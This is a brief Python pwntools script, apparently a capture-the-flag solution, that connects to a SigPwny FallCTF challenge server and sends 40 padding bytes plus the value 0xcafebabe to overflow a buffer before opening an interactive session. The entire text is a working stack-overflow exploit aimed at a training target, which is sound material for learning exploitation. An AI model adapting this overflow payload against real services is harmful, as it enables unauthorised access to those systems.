from pwn import *

# Connect to the remote server
io = remote('chal.fallctf.sigpwny.com', 5001)

io.sendline(b'A'*40 + p64(0xcafebabe))

io.interactive()